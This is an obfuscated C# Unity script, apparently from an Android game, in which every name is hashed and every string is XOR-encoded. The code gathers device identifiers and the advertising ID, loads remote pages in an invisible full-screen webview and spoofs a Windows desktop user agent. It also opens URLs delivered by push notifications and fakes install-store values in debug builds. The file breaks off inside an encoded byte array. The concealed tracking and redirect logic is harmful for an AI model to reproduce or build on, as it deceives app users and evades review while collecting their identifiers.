using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.Core;
using Unity.Services.Leaderboards;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

[Serializable]
public class _0x6fdccca8
{
    [JsonProperty(DefaultValueHandling = DefaultValueHandling.Ignore, NullValueHandling = NullValueHandling.Ignore)]
    [DefaultValue("")]
    public string payload = "";
    [JsonProperty(DefaultValueHandling = DefaultValueHandling.Ignore, NullValueHandling = NullValueHandling.Ignore)]
    [DefaultValue("")]
    public string meta = "";
    [JsonProperty(DefaultValueHandling = DefaultValueHandling.Ignore, NullValueHandling = NullValueHandling.Ignore)]
    [DefaultValue("")]
    public string isMeta = "";
}

public class _0x04c385c5 : MonoBehaviour
{
    private void OnApplicationPause(bool _0xd4ba5031)
    {
        isApplicationPause = _0xd4ba5031;
    }

    private bool TryOpenExternalLikeChrome(string _0x86d898db)
    {
        if (string.IsNullOrEmpty(_0x86d898db))
            return false;
        if (_0x86d898db.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[9] { 140, 139, 145, 128, 139, 145, 223, 202, 202 }, 229), StringComparison.OrdinalIgnoreCase))
            return _0x3ca44d57(_0x86d898db);
        if (_0x15aae03a(_0x86d898db))
            return _0xe0e35fe8(_0x86d898db, null);
        if (!_0x86d898db.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[7] { 66, 94, 94, 90, 16, 5, 5 }, 42), StringComparison.OrdinalIgnoreCase) && !_0x86d898db.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[8] { 170, 182, 182, 178, 177, 248, 237, 237 }, 194), StringComparison.OrdinalIgnoreCase) && !_0x86d898db.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[11] { 43, 40, 37, 63, 62, 112, 40, 38, 43, 36, 33 }, 74), StringComparison.OrdinalIgnoreCase))
        {
            return _0x82afa311(_0x86d898db);
        }

        return false;
    }

    internal bool firstLoadShown = false;
    private async Task<bool> _0x553e95ff()
    {
        {
#if B_LOGS
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[37] { 135, 136, 185, 175, 168, 129, 252, 143, 181, 187, 178, 149, 178, 137, 178, 181, 168, 165, 143, 185, 174, 170, 181, 191, 185, 175, 157, 178, 179, 178, 165, 177, 179, 169, 175, 176, 165 }, 220));
#endif
        }

        try
        {
            var _0x5bd29a06 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x5bd29a06);
            {
#if B_LOGS
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[32] { 142, 129, 176, 166, 161, 136, 245, 128, 187, 188, 161, 172, 134, 176, 167, 163, 188, 182, 176, 166, 245, 156, 187, 188, 161, 188, 180, 185, 188, 175, 176, 177 }, 213));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[20] { 48, 33, 55, 48, 68, 49, 10, 13, 16, 29, 55, 1, 22, 18, 13, 7, 1, 23, 94, 68 }, 100) + ex.Message);
#endif
            }

            _0xe45971d9?._0x612638ad();
            return true;
        }

        bool _0xdfbc94bb = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0xdfbc94bb = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[37] { 89, 86, 103, 113, 118, 95, 34, 81, 107, 101, 108, 47, 107, 108, 34, 67, 108, 109, 108, 123, 111, 109, 119, 113, 44, 34, 82, 110, 99, 123, 103, 112, 34, 75, 70, 56, 34 }, 2) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0xfc9123f6 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[25] { 95, 78, 88, 95, 43, 88, 98, 108, 101, 38, 98, 101, 43, 74, 126, 127, 99, 43, 78, 89, 89, 68, 89, 49, 43 }, 11) + ex.Message);
#endif
                }

                _0xe45971d9?._0x612638ad();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[28] { 16, 1, 23, 16, 100, 23, 45, 35, 42, 105, 45, 42, 100, 22, 33, 53, 49, 33, 55, 48, 100, 1, 22, 22, 11, 22, 126, 100 }, 68) + ex.Message);
#endif
                }

                _0xe45971d9?._0x612638ad();
                return true;
            }
        }
        while (!_0xdfbc94bb);
        return false;
    }

    private void _0x79fe398a()
    {
        _0xcab4c561 = true;
        if (_0xb0cde9c4 != null)
            _0xb0cde9c4.SetUserAgent(_0xd89d31d4());
    }

    private string _0x755e078f = "";
    private string _0x51164e0e = "";
    private string _0xb9a48880 = "";
    private static string ReadPushField(Dictionary<string, object> _0x2fb63667, string _0x11eb29fb)
    {
        if (_0x2fb63667 == null || string.IsNullOrEmpty(_0x11eb29fb))
            return string.Empty;
        if (_0x2fb63667.TryGetValue(_0x4a5fc9c1._0x562286b4(new byte[16] { 207, 206, 213, 200, 199, 200, 194, 192, 213, 200, 206, 207, 229, 192, 213, 192 }, 161), out var raw))
        {
            try
            {
                var _0x6421277d = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0x6421277d != null && _0x6421277d.TryGetValue(_0x11eb29fb, out var nestedVal))
                {
                    var _0xc452beca = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0xc452beca))
                        return _0xc452beca;
                }
            }
            catch
            {
            }
        }

        if (_0x2fb63667.TryGetValue(_0x11eb29fb, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private IEnumerator _0x60fe50a4(string _0x4002f300)
    {
        if (_0xb0cde9c4 != null && _0xb5ba4613)
            yield break;
        _0xb0cde9c4 = gameObject.AddComponent<UniWebView>();
        _0x8ec30f06(_0xb0cde9c4);
        _0x98c119c4(_0xb0cde9c4);
        _0xb0cde9c4.BackgroundColor = Color.clear;
        var _0x57ba74fc = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0x3b5dc283();
        yield return new WaitForEndOfFrame();
        _0xb5ba4613 = true;
        _0x3972d08e();
        _0x56e4205f(true);
        _0x549439fb = false;
        _0xcab4c561 = false;
        _0x2b229fe6.Clear();
        _0x2d56d5cb = -1;
        firstLoadShown = false;
        _0xa13497b1 = false;
        _0x7ee130e8 = false;
        _0xb0cde9c4.SetUserAgent("");
        _0x9b598e6f = Time.realtimeSinceStartup;
        _0xb0cde9c4.Stop();
        _0xb0cde9c4.Load(_0x4002f300);
        _0xb0cde9c4.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x4a5fc9c1._0x562286b4(new byte[25] { 114, 94, 86, 81, 31, 104, 90, 93, 105, 86, 90, 72, 31, 118, 81, 86, 75, 86, 94, 83, 31, 108, 87, 80, 72 }, 63));
    }

    private bool _0x3ca44d57(string _0xb6fcbd76)
    {
        try
        {
            using (var _0xfe45a0f0 = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[30] { 146, 158, 156, 223, 132, 159, 152, 133, 136, 194, 149, 223, 129, 157, 144, 136, 148, 131, 223, 164, 159, 152, 133, 136, 161, 157, 144, 136, 148, 131 }, 241)))
            using (var _0x25e0afe1 = _0xfe45a0f0.GetStatic<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[15] { 21, 3, 4, 4, 19, 24, 2, 55, 21, 2, 31, 0, 31, 2, 15 }, 118)))
            using (var _0x4602369d = _0x25e0afe1.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[17] { 0, 2, 19, 55, 6, 4, 12, 6, 0, 2, 42, 6, 9, 6, 0, 2, 21 }, 103)))
            using (var _0x1059c302 = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[22] { 94, 81, 91, 77, 80, 86, 91, 17, 92, 80, 81, 75, 90, 81, 75, 17, 118, 81, 75, 90, 81, 75 }, 63)))
            using (var _0xa009423c = _0x1059c302.CallStatic<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[8] { 67, 82, 65, 64, 86, 102, 65, 90 }, 51), _0xb6fcbd76, 1))
            {
                string _0x63c8bd66 = _0xa009423c.Call<string>(_0x4a5fc9c1._0x562286b4(new byte[14] { 121, 123, 106, 77, 106, 108, 119, 112, 121, 91, 102, 106, 108, 127 }, 30), _0x4a5fc9c1._0x562286b4(new byte[20] { 133, 149, 136, 144, 148, 130, 149, 184, 129, 134, 139, 139, 133, 134, 132, 140, 184, 146, 149, 139 }, 231));
                string _0x272f7fc3 = _0xa009423c.Call<string>(_0x4a5fc9c1._0x562286b4(new byte[10] { 223, 221, 204, 232, 217, 219, 211, 217, 223, 221 }, 184));
                _0xa009423c.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[11] { 139, 142, 142, 169, 139, 158, 143, 141, 133, 152, 147 }, 234), _0x4a5fc9c1._0x562286b4(new byte[33] { 191, 176, 186, 172, 177, 183, 186, 240, 183, 176, 170, 187, 176, 170, 240, 189, 191, 170, 187, 185, 177, 172, 167, 240, 156, 140, 145, 137, 141, 159, 156, 146, 155 }, 222));
                _0xa009423c.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[11] { 179, 164, 172, 174, 183, 164, 132, 185, 181, 179, 160 }, 193), _0x4a5fc9c1._0x562286b4(new byte[20] { 120, 104, 117, 109, 105, 127, 104, 69, 124, 123, 118, 118, 120, 123, 121, 113, 69, 111, 104, 118 }, 26));
                if (_0xa009423c.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[15] { 113, 102, 112, 108, 111, 117, 102, 66, 96, 119, 106, 117, 106, 119, 122 }, 3), _0x4602369d) != null)
                {
                    WLog(_0x4a5fc9c1._0x562286b4(new byte[24] { 235, 192, 218, 199, 197, 205, 228, 193, 195, 205, 136, 199, 216, 205, 198, 136, 193, 198, 220, 205, 198, 220, 146, 136 }, 168) + _0xb6fcbd76);
                    _0xa009423c.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[8] { 25, 28, 28, 62, 20, 25, 31, 11 }, 120), 0x10000000);
                    _0x25e0afe1.Call(_0x4a5fc9c1._0x562286b4(new byte[13] { 135, 128, 149, 134, 128, 181, 151, 128, 157, 130, 157, 128, 141 }, 244), _0xa009423c);
                    return true;
                }

                if (_0xfd208c7d(_0x272f7fc3))
                    return true;
                if (!string.IsNullOrEmpty(_0x63c8bd66))
                {
                    WLog(_0x4a5fc9c1._0x562286b4(new byte[28] { 16, 59, 33, 60, 62, 54, 31, 58, 56, 54, 115, 58, 61, 39, 54, 61, 39, 115, 53, 50, 63, 63, 49, 50, 48, 56, 105, 115 }, 83) + _0x63c8bd66);
                    if (_0x15aae03a(_0x63c8bd66))
                        return _0xe0e35fe8(_0x63c8bd66, _0x272f7fc3);
                    return _0x82afa311(_0x63c8bd66);
                }

                WLog(_0x4a5fc9c1._0x562286b4(new byte[30] { 207, 228, 254, 227, 225, 233, 192, 229, 231, 233, 172, 229, 226, 248, 233, 226, 248, 172, 226, 227, 172, 228, 237, 226, 232, 224, 233, 254, 182, 172 }, 140) + _0xb6fcbd76);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x4a5fc9c1._0x562286b4(new byte[26] { 14, 37, 63, 34, 32, 40, 1, 36, 38, 40, 109, 36, 35, 57, 40, 35, 57, 109, 43, 44, 36, 33, 40, 41, 119, 109 }, 77) + e.Message);
            return true;
        }
    }

    private void _0x56e4205f(bool _0xe3077688)
    {
        _0x3972d08e();
        _0xa8a2a91f.SetActive(_0xe3077688);
        _0x297493b5 = _0xe3077688;
        if (_0xe3077688)
        {
            _0xa8a2a91f.transform.SetAsLastSibling();
            if (_0x746293ac != null)
                _0x746293ac.localRotation = Quaternion.identity;
        }
    }

    public void _0x01a510ea()
    {
        if (_0xb5ba4613)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[33] { 237, 226, 211, 197, 194, 235, 150, 226, 223, 219, 211, 196, 150, 217, 195, 194, 150, 155, 136, 150, 219, 217, 192, 211, 150, 194, 217, 150, 197, 213, 211, 216, 211 }, 182));
            }
#endif
        }

        _0x612638ad();
    }

    private string _0x81fa7a87;
    private bool _0x297493b5 = false;
    private bool _0xacad093a()
    {
        var _0x5693c4dd = _0xe933abed();
        if (_0x5693c4dd == null)
            return false;
        WLog(_0x4a5fc9c1._0x562286b4(new byte[31] { 65, 104, 123, 109, 126, 104, 123, 108, 41, 107, 104, 106, 98, 41, 36, 55, 41, 121, 102, 121, 124, 121, 41, 78, 102, 75, 104, 106, 98, 51, 41 }, 9) + _0x5693c4dd.Id);
        _0x5693c4dd.GoBack();
        return true;
    }

    private string _0xd00ef726 = "";
    private string _0x5855b16d = "";
    private string _0xf3290b49 = "";
    private int _0xe6026566 = 0;
    private Canvas _0x145d153f()
    {
        if (_0x83629931 != null)
            return _0x83629931;
        var _0x02e23e18 = gameObject.GetComponentInChildren<Canvas>();
        if (_0x02e23e18 == null)
        {
            var _0xb8a57e66 = new GameObject(_0x4a5fc9c1._0x562286b4(new byte[6] { 110, 76, 67, 91, 76, 94 }, 45), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x02e23e18 = _0xb8a57e66.GetComponent<Canvas>();
            _0x02e23e18.transform.SetParent(transform, false);
            _0x02e23e18.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x83629931 = _0x02e23e18;
        return _0x83629931;
    }

    static byte[] Decode93(string _0xe2091e7b)
    {
        var _0x7f25bf77 = System.Numerics.BigInteger.Zero;
        var _0x16f31cc9 = new System.Numerics.BigInteger(TextAlphabet.Length);
        for (int _0x48b9eb5c = 0; _0x48b9eb5c < _0xe2091e7b.Length; _0x48b9eb5c++)
        {
            char _0xca82135e = _0xe2091e7b[_0x48b9eb5c];
            if (_0xca82135e >= _0x9615872f.Length)
                throw new FormatException();
            int _0xa147baaa = _0x9615872f[_0xca82135e];
            if (_0xa147baaa < 0)
                throw new FormatException();
            _0x7f25bf77 = _0x7f25bf77 * _0x16f31cc9 + _0xa147baaa;
        }

        var _0xb56cf3fa = ToBigEndian(_0x7f25bf77);
        if (_0xb56cf3fa.Length < 2 || _0xb56cf3fa[0] != 1)
            throw new FormatException();
        var _0x00f3c875 = new byte[_0xb56cf3fa.Length - 1];
        Buffer.BlockCopy(_0xb56cf3fa, 1, _0x00f3c875, 0, _0x00f3c875.Length);
        return _0x00f3c875;
    }

    private string _0xf4634911 = "";
    private Action _0x11034555;
    private void _0xec3201a0()
    {
        {
#if B_LOGS
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[22] { 94, 81, 96, 118, 113, 88, 37, 86, 113, 106, 119, 96, 65, 96, 115, 108, 102, 96, 76, 107, 99, 106 }, 5));
#endif
        }

        _0x09763a2d = SystemInfo.deviceModel;
        _0x05aab7a4 = Application.version;
        _0xe91e8671 = Application.installMode;
        _0x3d63c50d = Application.installerName;
        _0x755e078f = Application.identifier;
        _0xe2c05b8b = _0x8346c102();
        _0xd6457b0c = _0xee2c4925();
        _0xfbcac81e = SystemInfo.deviceUniqueIdentifier;
        _0xd00ef726 = SystemInfo.graphicsDeviceName;
        _0x9a3dae18 = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x05aab7a4 = _0x4a5fc9c1._0x562286b4(new byte[5] { 61, 36, 61, 36, 61 }, 10);
                _0xe91e8671 = ApplicationInstallMode.Store;
                _0x3d63c50d = _0x4a5fc9c1._0x562286b4(new byte[19] { 13, 1, 3, 64, 15, 0, 10, 28, 1, 7, 10, 64, 24, 11, 0, 10, 7, 0, 9 }, 110);
                _0xd6457b0c = _0x4a5fc9c1._0x562286b4(new byte[8] { 48, 56, 37, 33, 44, 117, 32, 52 }, 85);
                _0xfbcac81e = Guid.NewGuid().ToString().Replace(_0x4a5fc9c1._0x562286b4(new byte[1] { 101 }, 72), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[17] { 142, 129, 176, 166, 161, 136, 245, 177, 176, 163, 152, 186, 177, 176, 185, 239, 245 }, 213) + _0x09763a2d);
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[19] { 252, 243, 194, 212, 211, 250, 135, 198, 215, 215, 241, 194, 213, 212, 206, 200, 201, 157, 135 }, 167) + _0x05aab7a4);
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[20] { 230, 233, 216, 206, 201, 224, 157, 212, 211, 206, 201, 220, 209, 209, 240, 210, 217, 216, 135, 157 }, 189) + _0xe91e8671);
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[23] { 21, 26, 43, 61, 58, 19, 110, 39, 32, 61, 58, 47, 34, 34, 43, 60, 29, 58, 33, 60, 43, 116, 110 }, 78) + _0x3d63c50d);
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[14] { 128, 143, 190, 168, 175, 134, 251, 186, 171, 171, 146, 191, 225, 251 }, 219) + _0x755e078f);
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[14] { 2, 13, 60, 42, 45, 4, 121, 56, 61, 47, 16, 61, 99, 121 }, 89) + _0xe2c05b8b);
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[18] { 183, 184, 137, 159, 152, 177, 204, 153, 159, 137, 158, 173, 139, 137, 130, 152, 214, 204 }, 236) + _0xd6457b0c);
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[17] { 220, 211, 226, 244, 243, 218, 167, 244, 254, 244, 195, 226, 241, 206, 227, 189, 167 }, 135) + _0xfbcac81e);
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[12] { 97, 110, 95, 73, 78, 103, 26, 93, 74, 79, 0, 26 }, 58) + _0xd00ef726);
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[12] { 5, 10, 59, 45, 42, 3, 126, 61, 46, 43, 100, 126 }, 94) + _0x9a3dae18);
#endif
        }
    }

    private void _0xbeadd530(string _0xde71c66b)
    {
        Dictionary<string, object> _0x324977af;
        try
        {
            _0x324977af = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xde71c66b);
        }
        catch
        {
            return;
        }

        var _0x3630dd6b = ReadPushField(_0x324977af, _0x4a5fc9c1._0x562286b4(new byte[3] { 56, 63, 33 }, 77));
        if (string.IsNullOrWhiteSpace(_0x3630dd6b))
            return;
        _0x3630dd6b = _0x3630dd6b.Trim();
        if (!IsHttpUrl(_0x3630dd6b))
            return;
        if (string.Equals(_0x3630dd6b, _0x81fa7a87, StringComparison.Ordinal))
            return;
        _0x81fa7a87 = _0x3630dd6b;
        OpenUrlExternally(_0x3630dd6b);
    }

    // PART 3
    private string _0x8346c102()
    {
        try
        {
            var _0x9f4adeb7 = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[30] { 57, 53, 55, 116, 47, 52, 51, 46, 35, 105, 62, 116, 42, 54, 59, 35, 63, 40, 116, 15, 52, 51, 46, 35, 10, 54, 59, 35, 63, 40 }, 90));
            var _0x1b25ce2d = _0x9f4adeb7.GetStatic<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[15] { 162, 180, 179, 179, 164, 175, 181, 128, 162, 181, 168, 183, 168, 181, 184 }, 193));
            var _0x8d6a35c8 = new AndroidJavaClass(_0x4a5fc9c1._0x562286b4(new byte[57] { 131, 143, 141, 206, 135, 143, 143, 135, 140, 133, 206, 129, 142, 132, 146, 143, 137, 132, 206, 135, 141, 147, 206, 129, 132, 147, 206, 137, 132, 133, 142, 148, 137, 134, 137, 133, 146, 206, 161, 132, 150, 133, 146, 148, 137, 147, 137, 142, 135, 169, 132, 163, 140, 137, 133, 142, 148 }, 224));
            var _0x3013f674 = _0x8d6a35c8.CallStatic<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[20] { 7, 5, 20, 33, 4, 22, 5, 18, 20, 9, 19, 9, 14, 7, 41, 4, 41, 14, 6, 15 }, 96), _0x1b25ce2d);
            var _0x18beed69 = _0x3013f674.Call<string>(_0x4a5fc9c1._0x562286b4(new byte[5] { 167, 165, 180, 137, 164 }, 192));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0x18beed69}");
#endif
            }

            return string.IsNullOrEmpty(_0x18beed69) ? "" : _0x18beed69;
        }
        catch
        {
            return "";
        }
    }

    private string _0xac264d7e()
    {
        return _0x4a5fc9c1._0x562286b4(new byte[12] { 32, 110, 125, 102, 107, 124, 97, 103, 102, 32, 33, 115 }, 8) + _0x4a5fc9c1._0x562286b4(new byte[8] { 17, 6, 21, 71, 18, 6, 90, 64 }, 103) + WindowsDesktopUserAgent + _0x4a5fc9c1._0x562286b4(new byte[2] { 143, 147 }, 168) + _0x4a5fc9c1._0x562286b4(new byte[30] { 49, 38, 53, 103, 55, 53, 40, 51, 40, 122, 9, 38, 49, 46, 32, 38, 51, 40, 53, 105, 55, 53, 40, 51, 40, 51, 62, 55, 34, 124 }, 71) + _0x4a5fc9c1._0x562286b4(new byte[121] { 83, 64, 91, 86, 65, 92, 90, 91, 21, 81, 80, 83, 29, 90, 87, 95, 25, 94, 80, 76, 25, 67, 84, 89, 28, 78, 65, 71, 76, 78, 122, 87, 95, 80, 86, 65, 27, 81, 80, 83, 92, 91, 80, 101, 71, 90, 69, 80, 71, 65, 76, 29, 90, 87, 95, 25, 94, 80, 76, 25, 78, 82, 80, 65, 15, 83, 64, 91, 86, 65, 92, 90, 91, 29, 28, 78, 71, 80, 65, 64, 71, 91, 21, 67, 84, 89, 14, 72, 25, 86, 90, 91, 83, 92, 82, 64, 71, 84, 87, 89, 80, 15, 65, 71, 64, 80, 72, 28, 14, 72, 86, 84, 65, 86, 93, 29, 80, 28, 78, 72, 72 }, 53) + _0x4a5fc9c1._0x562286b4(new byte[26] { 57, 56, 59, 117, 45, 47, 50, 41, 50, 113, 122, 40, 46, 56, 47, 28, 58, 56, 51, 41, 122, 113, 40, 60, 116, 102 }, 93) + _0x4a5fc9c1._0x562286b4(new byte[130] { 11, 10, 9, 71, 31, 29, 0, 27, 0, 67, 72, 14, 31, 31, 57, 10, 29, 28, 6, 0, 1, 72, 67, 72, 90, 65, 95, 79, 71, 56, 6, 1, 11, 0, 24, 28, 79, 33, 59, 79, 94, 95, 65, 95, 84, 79, 56, 6, 1, 89, 91, 84, 79, 23, 89, 91, 70, 79, 46, 31, 31, 3, 10, 56, 10, 13, 36, 6, 27, 64, 90, 92, 88, 65, 92, 89, 79, 71, 36, 39, 59, 34, 35, 67, 79, 3, 6, 4, 10, 79, 40, 10, 12, 4, 0, 70, 79, 44, 7, 29, 0, 2, 10, 64, 94, 93, 95, 65, 95, 65, 95, 65, 95, 79, 60, 14, 9, 14, 29, 6, 64, 90, 92, 88, 65, 92, 89, 72, 70, 84 }, 111) + _0x4a5fc9c1._0x562286b4(new byte[30] { 201, 200, 203, 133, 221, 223, 194, 217, 194, 129, 138, 221, 193, 204, 217, 203, 194, 223, 192, 138, 129, 138, 250, 196, 195, 158, 159, 138, 132, 150 }, 173) + _0x4a5fc9c1._0x562286b4(new byte[34] { 25, 24, 27, 85, 13, 15, 18, 9, 18, 81, 90, 11, 24, 19, 25, 18, 15, 90, 81, 90, 58, 18, 18, 26, 17, 24, 93, 52, 19, 30, 83, 90, 84, 70 }, 125) + _0x4a5fc9c1._0x562286b4(new byte[30] { 146, 147, 144, 222, 134, 132, 153, 130, 153, 218, 209, 155, 151, 142, 162, 153, 131, 149, 158, 166, 153, 159, 152, 130, 133, 209, 218, 198, 223, 205 }, 246) + _0x4a5fc9c1._0x562286b4(new byte[449] { 158, 152, 147, 145, 156, 139, 152, 202, 159, 139, 142, 215, 145, 136, 152, 139, 132, 142, 153, 208, 177, 145, 136, 152, 139, 132, 142, 208, 205, 169, 130, 152, 133, 135, 131, 159, 135, 205, 198, 156, 143, 152, 153, 131, 133, 132, 208, 205, 219, 216, 218, 205, 151, 198, 145, 136, 152, 139, 132, 142, 208, 205, 173, 133, 133, 141, 134, 143, 202, 169, 130, 152, 133, 135, 143, 205, 198, 156, 143, 152, 153, 131, 133, 132, 208, 205, 219, 216, 218, 205, 151, 198, 145, 136, 152, 139, 132, 142, 208, 205, 164, 133, 158, 215, 171, 213, 168, 152, 139, 132, 142, 205, 198, 156, 143, 152, 153, 131, 133, 132, 208, 205, 216, 222, 205, 151, 183, 198, 135, 133, 136, 131, 134, 143, 208, 140, 139, 134, 153, 143, 198, 154, 134, 139, 158, 140, 133, 152, 135, 208, 205, 189, 131, 132, 142, 133, 157, 153, 205, 198, 141, 143, 158, 162, 131, 141, 130, 175, 132, 158, 152, 133, 154, 147, 188, 139, 134, 159, 143, 153, 208, 140, 159, 132, 137, 158, 131, 133, 132, 194, 195, 145, 152, 143, 158, 159, 152, 132, 202, 186, 152, 133, 135, 131, 153, 143, 196, 152, 143, 153, 133, 134, 156, 143, 194, 145, 139, 152, 137, 130, 131, 158, 143, 137, 158, 159, 152, 143, 208, 205, 146, 210, 220, 205, 198, 136, 131, 158, 132, 143, 153, 153, 208, 205, 220, 222, 205, 198, 135, 133, 136, 131, 134, 143, 208, 140, 139, 134, 153, 143, 198, 135, 133, 142, 143, 134, 208, 205, 205, 198, 154, 134, 139, 158, 140, 133, 152, 135, 208, 205, 189, 131, 132, 142, 133, 157, 153, 205, 198, 154, 134, 139, 158, 140, 133, 152, 135, 188, 143, 152, 153, 131, 133, 132, 208, 205, 219, 223, 196, 218, 196, 218, 205, 198, 159, 139, 172, 159, 134, 134, 188, 143, 152, 153, 131, 133, 132, 208, 205, 219, 216, 218, 196, 218, 196, 218, 196, 218, 205, 151, 195, 209, 151, 151, 209, 165, 136, 128, 143, 137, 158, 196, 142, 143, 140, 131, 132, 143, 186, 152, 133, 154, 143, 152, 158, 147, 194, 154, 152, 133, 158, 133, 198, 205, 159, 153, 143, 152, 171, 141, 143, 132, 158, 174, 139, 158, 139, 205, 198, 145, 141, 143, 158, 208, 140, 159, 132, 137, 158, 131, 133, 132, 194, 195, 145, 152, 143, 158, 159, 152, 132, 202, 159, 139, 142, 209, 151, 198, 137, 133, 132, 140, 131, 141, 159, 152, 139, 136, 134, 143, 208, 158, 152, 159, 143, 151, 195, 209, 151, 137, 139, 158, 137, 130, 194, 143, 195, 145, 151 }, 234) + _0x4a5fc9c1._0x562286b4(new byte[112] { 83, 82, 81, 31, 68, 84, 69, 82, 82, 89, 27, 16, 64, 94, 83, 67, 95, 16, 27, 6, 14, 5, 7, 30, 12, 83, 82, 81, 31, 68, 84, 69, 82, 82, 89, 27, 16, 95, 82, 94, 80, 95, 67, 16, 27, 6, 7, 15, 7, 30, 12, 83, 82, 81, 31, 68, 84, 69, 82, 82, 89, 27, 16, 86, 65, 86, 94, 91, 96, 94, 83, 67, 95, 16, 27, 6, 14, 5, 7, 30, 12, 83, 82, 81, 31, 68, 84, 69, 82, 82, 89, 27, 16, 86, 65, 86, 94, 91, 127, 82, 94, 80, 95, 67, 16, 27, 6, 7, 3, 7, 30, 12 }, 55) + _0x4a5fc9c1._0x562286b4(new byte[45] { 176, 182, 189, 191, 179, 173, 170, 160, 171, 179, 234, 171, 170, 176, 171, 177, 167, 172, 183, 176, 165, 182, 176, 249, 177, 170, 160, 161, 162, 173, 170, 161, 160, 255, 185, 167, 165, 176, 167, 172, 236, 161, 237, 191, 185 }, 196) + _0x4a5fc9c1._0x562286b4(new byte[721] { 6, 0, 11, 9, 4, 19, 0, 82, 29, 0, 27, 21, 79, 5, 27, 28, 22, 29, 5, 92, 31, 19, 6, 17, 26, 63, 23, 22, 27, 19, 92, 16, 27, 28, 22, 90, 5, 27, 28, 22, 29, 5, 91, 73, 5, 27, 28, 22, 29, 5, 92, 31, 19, 6, 17, 26, 63, 23, 22, 27, 19, 79, 20, 7, 28, 17, 6, 27, 29, 28, 90, 3, 91, 9, 4, 19, 0, 82, 1, 79, 33, 6, 0, 27, 28, 21, 90, 3, 91, 92, 6, 29, 62, 29, 5, 23, 0, 49, 19, 1, 23, 90, 91, 73, 27, 20, 90, 1, 92, 27, 28, 22, 23, 10, 61, 20, 90, 85, 2, 29, 27, 28, 6, 23, 0, 72, 82, 17, 29, 19, 0, 1, 23, 85, 91, 76, 79, 66, 14, 14, 1, 92, 27, 28, 22, 23, 10, 61, 20, 90, 85, 26, 29, 4, 23, 0, 72, 82, 28, 29, 28, 23, 85, 91, 76, 79, 66, 14, 14, 1, 92, 27, 28, 22, 23, 10, 61, 20, 90, 85, 31, 19, 10, 95, 5, 27, 22, 6, 26, 85, 91, 76, 79, 66, 14, 14, 1, 92, 27, 28, 22, 23, 10, 61, 20, 90, 85, 31, 19, 10, 95, 22, 23, 4, 27, 17, 23, 95, 5, 27, 22, 6, 26, 85, 91, 76, 79, 66, 91, 0, 23, 6, 7, 0, 28, 82, 9, 31, 19, 6, 17, 26, 23, 1, 72, 20, 19, 30, 1, 23, 94, 31, 23, 22, 27, 19, 72, 